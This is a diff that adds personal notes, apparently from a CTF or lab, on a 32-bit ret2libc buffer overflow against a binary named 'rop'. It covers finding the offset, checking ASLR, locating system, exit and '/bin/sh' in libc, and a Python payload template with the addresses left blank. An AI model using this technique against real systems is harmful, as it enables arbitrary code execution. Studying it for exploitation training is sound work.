@@ -1,0 +1,52 @@
+pattern_create 100
+pattern_offset 
+checksec
+ 
+check the value /proc/sys/kernel/randomize_va_space 
+0 ASLR is disable
+
+ldd rop 
+
+libc = 0xb7e19000
+
+readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
+
+system =
+
+readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit 
+
+exit =
+
+strings -atx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
+
+binsh =
+
+formula
+---------------
+libc =
+system = libc + 
+exit = libc + 
+binsh = libc +
+---------------
+python exploit 
+-----------
+
+import struct
+
+trash  = "S" *52 
+
+libc =
+system = struct.pack('<I', libc + )
+exit = struct.pack('<I', libc + )
+binsh = struct.pack('<I', libc +)
+
+payload = trash + system + exit + binsh
+ 
+print payload 
+
+-------------------------
+
+final cmd ./rop $(python /dev/shm/exploit.py)
+
+
+
